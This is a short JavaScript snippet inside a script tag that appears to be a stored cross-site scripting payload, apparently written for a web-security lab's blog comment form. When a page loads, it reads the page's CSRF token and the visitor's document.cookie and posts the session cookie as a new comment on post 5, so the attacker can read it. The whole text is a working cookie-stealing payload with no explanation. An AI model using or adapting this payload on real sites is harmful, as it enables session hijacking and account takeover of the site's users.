<script>
document.addEventListener("DOMContentLoaded", () => {

const csrf=document.getElementsByName('csrf')[0].value;
const session=document.cookie;

var data = new FormData();

data.append('csrf', csrf);
data.append('postId', 5);
data.append('comment', session);
data.append('name', 'jeff');
data.append('email', 'sussybakas23@gmail.com');
data.append('website', 'http://tonightsthenight.com');

fetch("/post/comment", {method: "POST", body: data });
});
</script>
